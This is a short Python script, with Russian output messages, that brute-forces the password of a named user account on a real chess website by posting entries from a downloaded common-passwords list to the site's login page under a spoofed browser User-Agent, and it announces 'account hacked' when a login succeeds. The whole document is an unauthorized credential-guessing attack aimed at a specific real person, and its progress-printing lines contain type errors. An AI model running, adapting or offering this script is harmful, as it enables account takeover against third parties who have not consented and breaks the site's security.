import requests, time

i = 0
dictionary = requests.get("https://raw.githubusercontent.com/BorisiukIvan/popular-passwords-list/main/listreal").text.split("\n")
user = "MicroMouse"
t1 = time.time()
for password in dictionary:
  r = requests.post(
     "https://mskchess.ru/login",
     {"username" : user, "password" : password},
     headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"},
  )
  i = i + 1
  if (r.status_code == 200):
     print("АККАУНТ ВЗЛОМАН, ЛОГИН="+user+", ПАРОЛЬ="+password)
     break
  t2 = time.time()
  print((i+0.)/(t2-t1)+"паролей/с, "+str(t2-t1)+" секунд потрачено, "+i+" паролей проверено, cейчас проверяется пароль "+password+"...      \r")
